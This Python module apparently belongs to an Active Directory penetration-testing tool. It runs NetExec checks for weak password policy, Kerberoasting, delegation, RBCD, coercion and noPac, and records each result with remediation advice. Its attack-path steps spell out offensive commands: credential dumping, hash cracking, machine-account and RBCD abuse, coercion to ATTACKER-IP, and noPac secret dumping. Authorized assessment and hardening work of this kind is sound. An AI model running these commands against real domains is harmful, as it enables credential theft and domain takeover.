"""Authenticated checks - require valid domain credentials.

With a valid domain account we can inspect the directory in far more depth:

* Password policy (lockout, min length, complexity)
* Domain user / admin enumeration
* Share enumeration with read/write mapping
* Kerberoastable service accounts
* Unconstrained / constrained delegation
* Resource-based constrained delegation (RBCD) enumeration
* MachineAccountQuota (adds risk for several privilege-escalation paths)
* LDAP signing / channel binding posture

Every check is a no-op that returns a *skipped* CheckResult when the required
tool is missing or when no credentials are available.
"""

from __future__ import annotations

import re

from ..paths import Capability, Noise, PathStep, Reliability
from ..runner import CheckResult, Finding, Severity, Target, ToolRunner
from . import looks_like_failure, require_tool, skipped_result

CATEGORY = "authenticated"


def _base_result(name: str) -> CheckResult:
    return CheckResult(name=name, category=CATEGORY)


def _guard(runner: ToolRunner, target: Target, name: str, tool: str = "nxc") -> CheckResult | None:
    """Common precondition check: credentials present and tool available."""
    if not target.authenticated:
        return skipped_result(name, CATEGORY, "no credentials supplied")
    return require_tool(runner, tool, name, CATEGORY)


def check_password_policy(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
    name = "Domain password policy"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args(), "--pass-pol"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    min_len_match = re.search(r"Minimum password length:\s*(\d+)", text)
    if min_len_match:
        min_len = int(min_len_match.group(1))
        if min_len < 12:
            result.add_finding(
                Finding(
                    title="Weak minimum password length",
                    severity=Severity.MEDIUM,
                    target=target.domain or target.host,
                    description=(
                        f"Minimum password length is {min_len}. Short passwords "
                        "are more susceptible to spraying and offline cracking."
                    ),
                    evidence=min_len_match.group(0),
                    remediation="Set a minimum password length of 14+ characters.",
                )
            )

    lockout_match = re.search(r"Account Lockout Threshold:\s*(\d+|None)", text)
    if lockout_match and lockout_match.group(1) in ("0", "None"):
        result.add_finding(
            Finding(
                title="No account lockout threshold",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description=(
                    "Account lockout is disabled, enabling unlimited password "
                    "guessing / spraying against domain accounts."
                ),
                evidence=lockout_match.group(0),
                remediation="Configure a sensible lockout threshold (e.g. 5-10).",
            )
        )
    return result


def check_admin_access(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
    """Detect if the supplied account has local admin (Pwn3d!) on the host."""
    name = "Local admin access with supplied account"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args()]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    if "Pwn3d!" in out.combined:
        result.add_finding(
            Finding(
                title="Supplied account has local administrator access",
                severity=Severity.HIGH,
                target=target.host,
                description=(
                    "The provided credentials grant local administrator rights "
                    "on this host, enabling credential dumping and lateral movement."
                ),
                evidence="netexec reported 'Pwn3d!'",
                remediation=(
                    "Review membership of local Administrators; apply least "
                    "privilege and LAPS for local admin passwords."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Local admin -> dump credentials",
                technique="Cred-dump",
                requires=frozenset({Capability.VALID_CREDENTIALS, Capability.LOCAL_ADMIN}),
                grants=Capability.CRACKABLE_HASH,
                command=f"nxc smb {target.host} -u USER -p PASS --lsa --sam",
                description=(
                    "Dump LSA secrets / SAM from a host where the account is "
                    "local admin; may yield privileged hashes for reuse."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.MODERATE,
                detail=target.host,
                source="check",
            )
        )
        # The account is already local admin; record that capability directly.
        result.add_step(
            PathStep(
                name="Confirmed local admin on host",
                technique="Local-admin",
                requires=frozenset({Capability.VALID_CREDENTIALS}),
                grants=Capability.LOCAL_ADMIN,
                command=f"nxc smb {target.host} -u USER -p PASS  # (Pwn3d!)",
                description="Supplied account is local admin on this host.",
                reliability=Reliability.GUARANTEED,
                noise=Noise.QUIET,
                detail=target.host,
                source="check",
            )
        )
    return result


def check_kerberoast(runner: ToolRunner, target: Target, timeout: int = 240) -> CheckResult:
    """Find Kerberoastable service accounts (accounts with SPNs)."""
    name = "Kerberoastable service accounts"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "--kerberoasting", "/dev/stdout"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    hashes = re.findall(r"\$krb5tgs\$\S+", out.combined)
    if hashes:
        result.add_finding(
            Finding(
                title="Kerberoastable accounts found",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    f"{len(hashes)} service account(s) with SPNs returned TGS "
                    "hashes that can be cracked offline to recover passwords."
                ),
                evidence="\n".join(h[:80] + "..." for h in hashes[:10]),
                remediation=(
                    "Use group Managed Service Accounts (gMSA) or long random "
                    "passwords (25+ chars) for SPN-bearing accounts."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Kerberoast -> TGS hash",
                technique="Kerberoast",
                requires=frozenset({Capability.VALID_CREDENTIALS}),
                grants=Capability.SPN_TGS,
                command=f"nxc ldap {target.host} -u USER -p PASS --kerberoasting out.tgs",
                description="Request TGS for SPN accounts to crack offline.",
                reliability=Reliability.HIGH,
                noise=Noise.QUIET,
                source="check",
            )
        )
        result.add_step(
            PathStep(
                name="Crack TGS -> service-account credentials",
                technique="Hash-crack",
                requires=frozenset({Capability.SPN_TGS}),
                grants=Capability.VALID_CREDENTIALS,
                command="hashcat -m 13100 out.tgs wordlist.txt",
                description=(
                    "Crack the TGS offline. Service accounts are often "
                    "privileged, so this can jump privilege tiers."
                ),
                reliability=Reliability.SPECULATIVE,
                noise=Noise.QUIET,
                source="check",
            )
        )
    return result


def check_delegation(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Enumerate accounts configured for Kerberos delegation."""
    name = "Kerberos delegation configuration"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "ldap", target.host, *target.nxc_auth_args(), "--find-delegation"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    if re.search(r"Unconstrained", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Unconstrained delegation configured",
                severity=Severity.HIGH,
                target=target.domain or target.host,
                description=(
                    "One or more accounts allow unconstrained delegation. If an "
                    "attacker compromises such a host they can capture TGTs of "
                    "any authenticating user, including domain admins."
                ),
                evidence=text[:800],
                remediation=(
                    "Remove unconstrained delegation; use constrained or "
                    "resource-based constrained delegation and mark sensitive "
                    "accounts as 'Account is sensitive and cannot be delegated'."
                ),
            )
        )
    elif re.search(r"Constrained|delegation", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Delegation configured (review recommended)",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description="Delegation relationships were found and should be reviewed.",
                evidence=text[:800],
                remediation="Audit delegation targets and remove where unnecessary.",
            )
        )
    return result


def check_machine_account_quota(
    runner: ToolRunner, target: Target, timeout: int = 120
) -> CheckResult:
    """Read ms-DS-MachineAccountQuota; a nonzero value enables several attacks."""
    name = "MachineAccountQuota"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = [
        "nxc",
        "ldap",
        target.host,
        *target.nxc_auth_args(),
        "-M",
        "maq",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    m = re.search(r"MachineAccountQuota:\s*(\d+)", out.combined)
    if m and int(m.group(1)) > 0:
        result.add_finding(
            Finding(
                title=f"MachineAccountQuota is {m.group(1)}",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description=(
                    "Any authenticated user can join up to "
                    f"{m.group(1)} computer(s) to the domain. This enables "
                    "attacks such as noPac and RBCD abuse."
                ),
                evidence=m.group(0),
                remediation="Set ms-DS-MachineAccountQuota to 0 and delegate "
                "machine-join rights explicitly.",
            )
        )
        result.add_step(
            PathStep(
                name="Create machine account (MAQ>0)",
                technique="MAQ-abuse",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.MACHINE_ACCOUNT,
                command=(
                    "addcomputer.py -computer-name 'PWN$' -computer-pass 'Passw0rd!' "
                    f"-dc-host {target.dc_ip or 'DC'} {target.domain}/USER:PASS"
                ),
                description=(
                    "Any authenticated user can add a computer account, a "
                    "prerequisite for RBCD and some noPac paths."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.MODERATE,
                source="check",
            )
        )
        # A controlled machine account + write over a target enables RBCD.
        result.add_step(
            PathStep(
                name="Configure RBCD -> impersonate on target",
                technique="RBCD",
                requires=frozenset({Capability.MACHINE_ACCOUNT, Capability.DACL_CONTROL}),
                grants=Capability.LOCAL_ADMIN,
                command=(
                    "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' "
                    f"-action write {target.domain}/USER:PASS"
                ),
                description=(
                    "With write access over a computer object and a controlled "
                    "machine account, configure resource-based constrained "
                    "delegation and request a service ticket as any user."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.MODERATE,
                source="check",
            )
        )
    return result


def check_rbcd(runner: ToolRunner, target: Target, timeout: int = 240) -> CheckResult:
    """Actively enumerate resource-based constrained delegation across hosts.

    Two things are reported:

    * Computer objects that already have
      ``msDS-AllowedToActOnBehalfOfOtherIdentity`` populated (an existing RBCD
      relationship worth reviewing / potentially abusable).
    * A path step noting that any computer object over which we hold write
      access can have RBCD configured against it.

    This complements the BloodHound-sourced RBCD edges by reading the attribute
    directly via LDAP, so RBCD opportunities surface even without a graph.
    """
    name = "RBCD enumeration (msDS-AllowedToActOnBehalfOfOtherIdentity)"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    # NetExec's LDAP --query lets us read the RBCD attribute across computers.
    argv = [
        "nxc",
        "ldap",
        target.host,
        *target.nxc_auth_args(),
        "--query",
        "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
        "sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # Hosts with the attribute present -> existing RBCD relationships.
    configured = re.findall(r"(\S+\$)\s", text)
    if re.search(r"AllowedToActOnBehalfOfOtherIdentity", text, re.IGNORECASE) and configured:
        result.add_finding(
            Finding(
                title="Existing RBCD relationships found",
                severity=Severity.MEDIUM,
                target=target.domain or target.host,
                description=(
                    "One or more computer accounts have "
                    "msDS-AllowedToActOnBehalfOfOtherIdentity populated. Review "
                    "these delegation relationships; an attacker controlling a "
                    "referenced principal can impersonate users to the host."
                ),
                evidence="\n".join(sorted(set(configured))[:30]) or text[:600],
                remediation=(
                    "Audit RBCD configuration; remove entries that are not "
                    "explicitly required and monitor writes to this attribute."
                ),
            )
        )

    # Regardless of existing config, holding write over a computer object lets
    # us configure RBCD against it. This connects DACL control -> RBCD.
    result.add_step(
        PathStep(
            name="Write over computer object -> configure RBCD",
            technique="RBCD-Configure",
            requires=frozenset({Capability.DACL_CONTROL, Capability.MACHINE_ACCOUNT}),
            grants=Capability.RBCD,
            command=(
                "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' "
                f"-action write {target.domain or 'DOMAIN'}/USER:PASS"
            ),
            description=(
                "With write access over a target computer object and a "
                "controlled machine account, set "
                "msDS-AllowedToActOnBehalfOfOtherIdentity to enable RBCD."
            ),
            reliability=Reliability.HIGH,
            noise=Noise.MODERATE,
            source="check",
        )
    )
    return result


def check_coercion(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Detect authentication-coercion surfaces on the target.

    Probes for the common coercion vectors that let an attacker force a
    computer (often a DC) to authenticate to an attacker-controlled host:

    * MS-EFSR  (PetitPotam)
    * MS-RPRN  (PrinterBug / spooler)
    * MS-DFSNM (DFSCoerce)
    * MS-FSRVP (ShadowCoerce)

    Uses NetExec's ``coerce_plus`` module in listen/check mode. A coercible
    host makes the WebDAV/relay and ESC8 chains real rather than assumed, so a
    positive result grants the COERCIBLE_AUTH capability.
    """
    name = "Authentication coercion surfaces (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce)"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    # coerce_plus with CHECK=True probes the vectors without firing a relay.
    argv = [
        "nxc", "smb", target.host, *target.nxc_auth_args(),
        "-M", "coerce_plus", "-o", "CHECK=True",
    ]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # coerce_plus reports vulnerable methods, e.g. "VULNERABLE" / method names.
    vectors = []
    for label, pat in (
        ("MS-EFSR (PetitPotam)", r"efsr|petitpotam"),
        ("MS-RPRN (PrinterBug)", r"rprn|printerbug|spooler"),
        ("MS-DFSNM (DFSCoerce)", r"dfsnm|dfscoerce"),
        ("MS-FSRVP (ShadowCoerce)", r"fsrvp|shadowcoerce"),
    ):
        if re.search(pat, text, re.IGNORECASE) and re.search(r"vulnerable|coerc", text, re.IGNORECASE):
            vectors.append(label)

    if vectors:
        result.add_finding(
            Finding(
                title="Host is coercible to authenticate",
                severity=Severity.HIGH,
                target=target.host,
                description=(
                    "The host responded to one or more coercion vectors ("
                    + ", ".join(vectors) + "). It can be forced to authenticate "
                    "to an attacker-controlled listener, enabling NTLM relay "
                    "(to LDAP for RBCD/shadow-creds, or to AD CS for ESC8)."
                ),
                evidence=text[:800],
                remediation=(
                    "Patch coercion CVEs, disable the Print Spooler on DCs where "
                    "not needed, restrict RPC, and enforce SMB/LDAP signing and "
                    "channel binding to neutralise relay."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="Coerce host authentication",
                technique="Coercion",
                requires=frozenset({Capability.LOW_PRIV_USER}),
                grants=Capability.COERCIBLE_AUTH,
                command=(
                    f"coercer coerce -u USER -p PASS -t {target.host} -l ATTACKER-IP"
                ),
                description="Force the host to authenticate to an attacker listener.",
                reliability=Reliability.HIGH,
                noise=Noise.LOUD,
                detail=", ".join(vectors),
                source="check",
            )
        )
    return result


def check_nopac(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
    """Detect noPac (CVE-2021-42278/42287) - sAMAccountName spoofing to DA.

    When a DC is unpatched and MachineAccountQuota permits creating a computer
    account, noPac impersonates a DC to obtain a privileged ticket, which is a
    direct, high-reliability route to DCSync / Domain Admin.
    """
    name = "noPac (CVE-2021-42278 / CVE-2021-42287)"
    guard = _guard(runner, target, name)
    if guard:
        return guard

    result = _base_result(name)
    argv = ["nxc", "smb", target.host, *target.nxc_auth_args(), "-M", "nopac"]
    out = runner.run(argv, timeout=timeout)
    result.command = out.command
    result.raw_output = out.combined
    result.return_code = out.return_code
    result.duration_seconds = out.duration_seconds
    if out.error:
        result.error = out.error
        return result

    text = out.combined
    # The nopac module indicates vulnerability, e.g. "VULNERABLE" / "got TGT".
    if re.search(r"vulnerable|nopac.*success|got tgt", text, re.IGNORECASE):
        result.add_finding(
            Finding(
                title="Domain Controller vulnerable to noPac",
                severity=Severity.CRITICAL,
                target=target.host,
                description=(
                    "The DC is vulnerable to noPac (CVE-2021-42278/42287). Any "
                    "authenticated user who can create a computer account can "
                    "impersonate a domain controller and obtain privileged "
                    "tickets, leading directly to Domain Admin / DCSync."
                ),
                evidence=text[:600],
                remediation=(
                    "Apply the November 2021 (and later) patches on all DCs and "
                    "set ms-DS-MachineAccountQuota to 0."
                ),
            )
        )
        result.add_step(
            PathStep(
                name="noPac -> privileged ticket / DCSync",
                technique="noPac",
                requires=frozenset({Capability.LOW_PRIV_USER, Capability.MACHINE_ACCOUNT}),
                grants=Capability.DCSYNC,
                command=(
                    "noPac.py -dc-ip {dc} DOMAIN/USER:PASS -dump".format(
                        dc=target.dc_ip or "DC-IP"
                    )
                ),
                description=(
                    "Exploit noPac to impersonate a DC and dump secrets "
                    "(equivalent to DCSync / Domain Admin)."
                ),
                reliability=Reliability.HIGH,
                noise=Noise.LOUD,
                source="check",
            )
        )
    return result


def _mark_inconclusive_on_failure(results: list[CheckResult]) -> list[CheckResult]:
    """Post-process: a ran-but-empty check whose output shows a connection or
    auth failure is inconclusive, not clean.

    Centralising this keeps every authenticated check from repeating the same
    boilerplate while ensuring a failed auth/connection is never silently read
    as "not vulnerable".
    """
    for r in results:
        if r.skipped or r.error or r.findings or r.inconclusive:
            continue
        signal = looks_like_failure(r.raw_output)
        if signal:
            r.mark_inconclusive(
                f"check ran but output shows '{signal}'; result may not reflect "
                "the target's true state"
            )
    return results


def run_all(runner: ToolRunner, target: Target, timeout: int = 300) -> list[CheckResult]:
    """Run every authenticated check and return the results."""
    results = [
        check_admin_access(runner, target, timeout=min(timeout, 120)),
        check_password_policy(runner, target, timeout=min(timeout, 120)),
        check_kerberoast(runner, target, timeout=timeout),
        check_delegation(runner, target, timeout=min(timeout, 180)),
        check_machine_account_quota(runner, target, timeout=min(timeout, 120)),
        check_rbcd(runner, target, timeout=min(timeout, 240)),
        check_coercion(runner, target, timeout=min(timeout, 180)),
        check_nopac(runner, target, timeout=min(timeout, 180)),
    ]
    return _mark_inconclusive_on_failure(results)
